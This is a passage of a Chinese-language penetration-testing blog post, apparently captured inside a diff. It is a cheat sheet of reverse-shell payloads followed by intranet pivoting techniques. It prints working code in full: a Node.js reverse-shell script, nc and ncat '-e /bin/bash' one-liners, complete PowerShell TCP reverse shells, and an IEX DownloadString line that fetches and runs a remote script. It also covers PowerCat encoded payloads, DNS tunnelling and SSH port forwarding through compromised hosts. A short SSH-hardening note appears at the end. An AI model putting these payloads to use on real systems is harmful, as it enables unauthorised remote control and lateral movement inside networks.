+</span></span><span class="line"><span class="cl"><span class="c1">#获取反弹shell后，可使用python获得交互式shell</span>
+</span></span><span class="line"><span class="cl">python -c<span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> python -c <span class="s1">&#39;&#39;&#39; import pty while(1):     try:         pty.spawn(&#34;/bin/bash&#34;)     except :         contiune&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Nodejs反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="k">function</span><span class="o">(){</span>
+</span></span><span class="line"><span class="cl">    var <span class="nv">net</span> <span class="o">=</span> require<span class="o">(</span><span class="s2">&#34;net&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">        <span class="nv">cp</span> <span class="o">=</span> require<span class="o">(</span><span class="s2">&#34;child_process&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">        <span class="nv">sh</span> <span class="o">=</span> cp.spawn<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, <span class="o">[])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    var <span class="nv">client</span> <span class="o">=</span> new net.Socket<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    client.connect<span class="o">(</span>8080, <span class="s2">&#34;10.17.26.64&#34;</span>, <span class="k">function</span><span class="o">(){</span>
+</span></span><span class="line"><span class="cl">        client.pipe<span class="o">(</span>sh.stdin<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        sh.stdout.pipe<span class="o">(</span>client<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        sh.stderr.pipe<span class="o">(</span>client<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">})</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> /a/<span class="p">;</span> // Prevents the Node.js application form crashing
+</span></span><span class="line"><span class="cl"><span class="o">})()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">require<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">&#39;nc -e /bin/sh [IPADDR] [PORT]&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">-var <span class="nv">x</span> <span class="o">=</span> global.process.mainModule.require
+</span></span><span class="line"><span class="cl">-x<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">&#39;nc [IPADDR] [PORT] -e /bin/bash&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ncat反向shell</span>
+</span></span><span class="line"><span class="cl">ncat 127.0.0.1 <span class="m">4444</span> -e /bin/bash
+</span></span><span class="line"><span class="cl">ncat --udp 127.0.0.1 <span class="m">4444</span> -e /bin/bash
+</span></span><span class="line"><span class="cl"><span class="c1"># 加密</span>
+</span></span><span class="line"><span class="cl">A:  ncat -c bash -allow 192.168.1.20 -vnl <span class="m">3333</span> --ssl  <span class="c1">#被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密</span>
+</span></span><span class="line"><span class="cl">B:  ncat -nv 192.168.1.19 <span class="m">3333</span> --ssl      <span class="c1">#攻击端</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 监听端口</span>
+</span></span><span class="line"><span class="cl">ncat -lvvp <span class="m">777</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># OpenSSL反弹shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># crontab反弹shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># MSF生成反弹shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Powershell反弹shell</span>
+</span></span><span class="line"><span class="cl">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&#34;[IPADDR]&#34;</span>,<span class="o">[</span>PORT<span class="o">])</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span>  <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&#34;PS &#34;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s2">&#34;&gt; &#34;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或</span>
+</span></span><span class="line"><span class="cl">powershell -nop -c <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.1.3.40&#39;,443);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或</span>
+</span></span><span class="line"><span class="cl">powershell IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>内网代理</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 场景：通过拿到的一台能访问的内网主机1，作为跳板(vps不能直接访问内网主机2)，拿到另外一台内网主机1才能访问到的内网主机2的shell</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># vps监听</span>
+</span></span><span class="line"><span class="cl">nc -lvp <span class="m">3333</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 内网主机2执行</span>
+</span></span><span class="line"><span class="cl">nc -lvp <span class="m">3333</span> -e /bin/bash
+</span></span><span class="line"><span class="cl"><span class="c1"># 内网主机1(边界服务器)执行</span>
+</span></span><span class="line"><span class="cl">nc -v vps_ip -c <span class="s2">&#34;nc -v 内网主机2_ip 3333&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3powercat">3.PowerCat</h4>
+<blockquote>
+<p>可以说是nc的powershell版本</p>
+</blockquote>
+<p>下载地址：https://github.com/besimorhino/powercat.git</p>
+<h6 id="用法">用法</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 导入模块</span>
+</span></span><span class="line"><span class="cl">Import-Moudle .<span class="se">\p</span>owercat.ps1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>既然说是nc的powershell版本，那就可以与nc配合连接:
+1.通过nc正向连接powercat</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 目标机器用powercat监听</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">8080</span> cmd.exe -v
+</span></span><span class="line"><span class="cl"><span class="c1"># 攻击机连接</span>
+</span></span><span class="line"><span class="cl">nc 192.168.56.130 <span class="m">8080</span> -vv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#参数</span>
+</span></span><span class="line"><span class="cl">-l    <span class="c1"># 监听</span>
+</span></span><span class="line"><span class="cl">-p    <span class="c1"># 指定端口</span>
+</span></span><span class="line"><span class="cl">-c    <span class="c1"># 指定要启动进程的名字</span>
+</span></span><span class="line"><span class="cl">-v    <span class="c1"># 显示详情</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.通过nc反向连接powercat</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 攻击机器监听</span>
+</span></span><span class="line"><span class="cl">nc -lvv -p <span class="m">8888</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标机器用powercat连接我们</span>
+</span></span><span class="line"><span class="cl">powercat -c 192.168.56.129 -p <span class="m">8888</span> -v -e cmd.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过powercat返回powershell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 如果想返回powershell，就无法与nc进行交互</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 建立正向shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 在目标机器执行</span>
+</span></span><span class="line"><span class="cl">IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&#34;http://10.10.10.1/powercat.ps1&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">9999</span> -v
+</span></span><span class="line"><span class="cl"><span class="c1"># 在客户端</span>
+</span></span><span class="line"><span class="cl">powercat -c 10.10.10.129 -p <span class="m">9999</span> -v -ep  <span class="c1"># -ep用于返回powershell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过powercat传递文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 服务端准备接收文件</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">9999</span> -of test.txt -v    <span class="c1"># -of 输出文件名</span>
+</span></span><span class="line"><span class="cl">powercat -c 10.10.10.129 -p <span class="m">9999</span> -i c:<span class="se">\1</span>.txt -v  <span class="c1"># -i 输入：可写文件名，也可直接写字符串</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用powercat生成payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 有正向、反向，且可以进行编码</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 客户端生成</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">8888</span> -e cme -v -g &gt;&gt;shell.ps1   <span class="c1"># 生成反弹shell的脚本</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#或者生成反弹powershell的脚本</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">7777</span> -ep -v -g &gt;&gt;shell2.ps1
+</span></span><span class="line"><span class="cl"><span class="c1"># 把生成的文件上传到目标并运行</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后在客户端执行</span>
+</span></span><span class="line"><span class="cl">powercat -c 10.10.10.129 -p <span class="m">8888</span> -v  <span class="c1"># 就会获得一个反弹shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 也可生成编码的payload</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 客户端运行</span>
+</span></span><span class="line"><span class="cl">powercat -c 10.10.10.129 -p <span class="m">6666</span> -ep -ge    <span class="c1"># -ge  生成经过编码的payload</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标运行</span>
+</span></span><span class="line"><span class="cl">powershell -E <span class="s2">&#34;上面的编码&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 继续客户端执行</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">9999</span> -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>PowerCat DNS隧道通信</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 由于其dns隧道是基于dnscat设计的，所以先下载安装编译它(放在目标机器Linux)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 下载地址：https://github.com/iagox86/dnscat2</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/iagox86/dnscat2
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> dnscat2/server/
+</span></span><span class="line"><span class="cl">gem install bundler
+</span></span><span class="line"><span class="cl">bundle install
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后，目标机器执行</span>
+</span></span><span class="line"><span class="cl">ruby dnscat2.rb ttpowercat.test -e open --no-cache
+</span></span><span class="line"><span class="cl"><span class="c1"># 回到我们的机器，执行</span>
+</span></span><span class="line"><span class="cl">powercat -c 192.168.56.129 -p <span class="m">53</span> -dns ttpowercat.tect -e cmd.exe  <span class="c1"># -dns表示使用dns进行通信</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后就能看到反弹回来的shell了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将powercat作为跳板</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 情景：vps可访问win7,但不能访问win server08 win7可访问win server08</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 以win7为跳板，来实现vps对win server08的访问</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### F1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1.在win server08执行</span>
+</span></span><span class="line"><span class="cl">powercat -l -v -p <span class="m">9999</span> -e cmd.exe
+</span></span><span class="line"><span class="cl"><span class="c1">#2.在win7(跳板)执行</span>
+</span></span><span class="line"><span class="cl">powercat -l -v -p <span class="m">8000</span> -r tcp:10.10.10.129:9999
+</span></span><span class="line"><span class="cl"><span class="c1">#3.vps上，连接win7</span>
+</span></span><span class="line"><span class="cl">nc 192.168.56.130 <span class="m">8000</span> -vv  <span class="c1"># 连接成功</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### F2. 使用DNS协议</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1. win7上</span>
+</span></span><span class="line"><span class="cl">powercat -l -p <span class="m">8000</span> -r dns:192.168.56.129::ttpowercat.test     <span class="c1"># 指定vps的地址</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2. vps上执行，启动dnscat</span>
+</span></span><span class="line"><span class="cl">ruby dnscat2.rb ttpowercat.test -e open --no-cache
+</span></span><span class="line"><span class="cl"><span class="c1">#3. win server08(目标机器)</span>
+</span></span><span class="line"><span class="cl">powercat -c 10.10.10.128 -p <span class="m">8000</span> -v -e cmd.exe
+</span></span><span class="line"><span class="cl"><span class="c1"># 就可以看到反弹shell了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powercat更多用法
+</span></span><span class="line"><span class="cl">​<span class="sb">```</span>bash
+</span></span><span class="line"><span class="cl"><span class="c1"># https://github.com/besimorhino/powercat</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="font-colorred-应用层隧道技术font"><font color=red> 应用层隧道技术</font></h2>
+<blockquote>
+<p>使用较多</p>
+</blockquote>
+<h4 id="1ssh隧道">1.SSH隧道</h4>
+<p>参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-C    <span class="c1"># 压缩传输(提高传输速度)</span>
+</span></span><span class="line"><span class="cl">-f    <span class="c1"># 后台执行</span>
+</span></span><span class="line"><span class="cl">-N    <span class="c1"># 静默连接(建立了链接，但是看不到具体会话)</span>
+</span></span><span class="line"><span class="cl">-g    <span class="c1"># 允许远程主机链接本地用于转发的端口</span>
+</span></span><span class="line"><span class="cl">-L    <span class="c1"># 本地端口转发</span>
+</span></span><span class="line"><span class="cl">-R    <span class="c1"># 远程端口转发</span>
+</span></span><span class="line"><span class="cl">-D    <span class="c1"># 动态转发(SOCKS代理)</span>
+</span></span><span class="line"><span class="cl">-P    <span class="c1"># 指定SSH端口</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SSH配置文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># vim /etc/ssh/sshd_config</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">AllowTcpForwarding yes    <span class="c1"># 允许转发TCP协议</span>
+</span></span><span class="line"><span class="cl">GatewayPorts   yes    <span class="c1"># 是否允许逻辑主机本地转发端口</span>
+</span></span><span class="line"><span class="cl">PermitRootLogin yes    <span class="c1">#允许root登录</span>
+</span></span><span class="line"><span class="cl">PasseordAuthentication   yes    <span class="c1"># 允许使用基于密码的认证</span>
+</span></span><span class="line"><span class="cl">TCPKeepAlive yes <span class="c1"># 阻止ssh断开</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后重启ssh服务</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>本地转发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># vps上执行</span>
+</span></span><span class="line"><span class="cl">ssh -CfNg -L 1153<span class="o">(</span>vps端口<span class="o">)</span>:1.1.1.10<span class="o">(</span>目标<span class="o">)</span>:3389<span class="o">(</span>目标端口<span class="o">)</span> root@192.168.1.11<span class="o">(</span>跳板机<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 输入跳板机器的密码</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 含义：将对方的3389端口映射到本地vps的1153上</span>
+</span></span><span class="line"><span class="cl">etstat -antlup <span class="p">|</span>grep <span class="s2">&#34;1153&#34;</span> <span class="c1"># 查看本地端口正在监听</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接本地的1153，就可以链接对面的远程链接了</span>
+</span></span><span class="line"><span class="cl">rdesktop 127.0.0.1:1153
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 其实就是一个正向的tcp连接</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程转发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Web服务器(跳板机器)执行</span>
+</span></span><span class="line"><span class="cl">ssh -CfNg -R 3307<span class="o">(</span>vps端口<span class="o">)</span>:1.1.1.10<span class="o">(</span>目标ip<span class="o">)</span>:3389<span class="o">(</span>目标端口<span class="o">)</span> root@192.168.1.4<span class="o">(</span>vps地址<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 将目标的3389端口映射到远程vps的3307上</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接vps的3307，就可以链接对面的远程链接了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>动态转发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#1. vps上执行</span>
+</span></span><span class="line"><span class="cl">ssh -CfNg -D 7000<span class="o">(</span>vps端口<span class="o">)</span> root@192.168.1.11<span class="o">(</span>跳板机器地址<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源</span>
+</span></span><span class="line"><span class="cl">... ... 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>防御思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">在系统中配置SSH远程管理白名单
+</span></span><span class="line"><span class="cl">在ACL中限制只有特定的IP地址才能连接SSH
+</span></span><span class="line"><span class="cl">以及设置系统完全使用带外管理等方法
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略<span class="o">(</span>从外部到内部:从内部到外部<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2httphttps隧道">2.HTTP/HTTPS隧道</h4>
